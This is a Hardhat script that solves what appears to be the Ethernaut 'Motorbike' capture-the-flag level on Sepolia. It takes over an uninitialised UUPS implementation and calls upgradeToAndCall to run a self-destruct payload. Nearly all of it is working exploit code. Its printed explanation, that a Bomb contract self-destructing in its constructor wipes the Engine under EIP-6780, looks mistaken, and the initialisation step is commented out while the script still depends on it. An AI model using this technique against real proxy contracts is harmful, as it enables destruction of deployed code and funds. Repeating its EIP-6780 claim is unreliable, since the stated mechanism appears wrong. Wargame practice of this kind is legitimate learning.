import { ethers } from "hardhat";

/**
 * Execute the Motorbike exploit to selfdestruct the Engine implementation
 * 
 * Usage:
 * EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourMotorbikeAddress npx hardhat run scripts/level-25-motorbike/execute-motorbike-exploit.ts --network sepolia
 * 
 * Or execute directly without exploit contract:
 * TARGET_ADDRESS=0xYourMotorbikeAddress npx hardhat run scripts/level-25-motorbike/execute-motorbike-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing Motorbike exploit...\n");
  
  // Get the target address from environment
  const targetAddress = process.env.TARGET_ADDRESS!;
  const exploitAddress = process.env.EXPLOIT_ADDRESS!;
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}\n`);
  
  try {
    // Connect to the Motorbike proxy
    const motorbike = await ethers.getContractAt("Motorbike", targetAddress);
    
    // Read the implementation address from storage
    const IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
    const implFromStorage = await ethers.provider.getStorage(targetAddress, IMPLEMENTATION_SLOT);
    const engineAddress = "0x" + implFromStorage.slice(-40);
    
    console.log("=== Initial State ===");
    console.log(`Motorbike Proxy: ${targetAddress}`);
    console.log(`Engine Implementation: ${engineAddress}`);
    
    // Connect to the Engine implementation directly
    const engine = await ethers.getContractAt("Engine", engineAddress);
    
    // Check if engine still has code
    const initialCode = await ethers.provider.getCode(engineAddress);
    console.log(`Engine code size: ${initialCode.length} bytes`);
    
    if (initialCode === "0x" || initialCode === "0x0") {
      console.log("\nâš ï¸  Engine is already destroyed!");
      return;
    }
    
    // Check if engine is initialized
    try {
      const upgrader = await engine.upgrader();
      const horsePower = await engine.horsePower();
      console.log(`Engine upgrader: ${upgrader}`);
      console.log(`Engine horsePower: ${horsePower}`);
      
      if (upgrader !== ethers.ZeroAddress && upgrader !== signer.address) {
        console.log("\nâš ï¸  Warning: Engine is already initialized by someone else!");
        return;
      }      
      if (upgrader === signer.address) {
        console.log("\nâœ“ We are already the upgrader! Proceeding to destroy...");
      }
    } catch (e) {
      console.log("Could not read engine state (might be uninitialized)");
    }
        
    // Execute the exploit
    console.log("\n=== Executing Exploit ===");
    console.log("\nEIP-6780 Compliant Approach:");
    console.log("  The exploit uses a Bomb contract that selfdestructs in its constructor.");
    console.log("  When explode() deploys Bomb via 'new Bomb()', both deployment and");
    console.log("  selfdestruct happen in the SAME TRANSACTION.");
    console.log("  This satisfies EIP-6780 requirement â†’ Engine code will be destroyed!\n");
    
    // // Step 1: Initialize the Engine implementation
    // console.log("âœ“ Step 1: Initializing Engine implementation directly...");
    // const initTx = await engine.initialize();
    // await initTx.wait();
    // console.log("  âœ“ Success! We are now the upgrader of the implementation");
    
    // Verify we're the upgrader
    const newUpgrader = await engine.upgrader();
    if (newUpgrader !== signer.address) {
      throw new Error(`Failed to become upgrader! Upgrader is: ${newUpgrader}`);
    }
    console.log(`  âœ“ Confirmed: upgrader = ${newUpgrader}`);
        
    const motorbikeExploit = await ethers.getContractAt("MotorbikeExploit", exploitAddress);
    
    // Step 2: Call upgradeToAndCall with explode payload
    console.log("\nâœ“ Step 2: Calling upgradeToAndCall with Bomb deployment...");
    console.log("  This will:");
    console.log("    1. Upgrade Engine to point to MotorbikeExploit");
    console.log("    2. Call explode() via delegatecall");
    console.log("    3. explode() deploys Bomb contract");
    console.log("    4. Bomb's constructor selfdestructs immediately");
    console.log("    5. Same tx = Engine code destroyed (EIP-6780 compliant!)");
    const explodeData = motorbikeExploit.interface.encodeFunctionData("explode");
    const upgradeTx = await engine.upgradeToAndCall(exploitAddress, explodeData);
    console.log(`  Transaction hash: ${upgradeTx.hash}`);
    console.log("  Waiting for confirmation...");
    
    await upgradeTx.wait();
    console.log("  âœ“ Transaction confirmed!");
    
    // Verify the engine is destroyed
    console.log("\n=== Verification ===");
    const finalCode = await ethers.provider.getCode(engineAddress);
    console.log(`Engine code size after exploit: ${finalCode.length} bytes`);
    
    if (finalCode === "0x" || finalCode === "0x0") {
      console.log("\nâœ… SUCCESS! Engine has been destroyed!");
      console.log("\nðŸŽ‰ The EIP-6780 compliant approach worked!");
      console.log("   By deploying Bomb and selfdestructing in its constructor,");
      console.log("   both operations happened in the same transaction.");
      console.log("   This satisfied EIP-6780's requirement and destroyed the Engine!\n");
      console.log("ðŸ”‘ Key Insight:");
      console.log("   selfdestruct still works if called in the SAME TRANSACTION");
      console.log("   as contract creation, even on post-Cancun networks!");      
    } else {
      console.log("\nâš ï¸  Engine code still exists.");
    }
    
  } catch (error: any) {
    console.error("\nâŒ Error executing Motorbike exploit:");
    if (error.message) {
      console.error("Error message:", error.message);
    }
    if (error.reason) {
      console.error("Reason:", error.reason);
    }
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
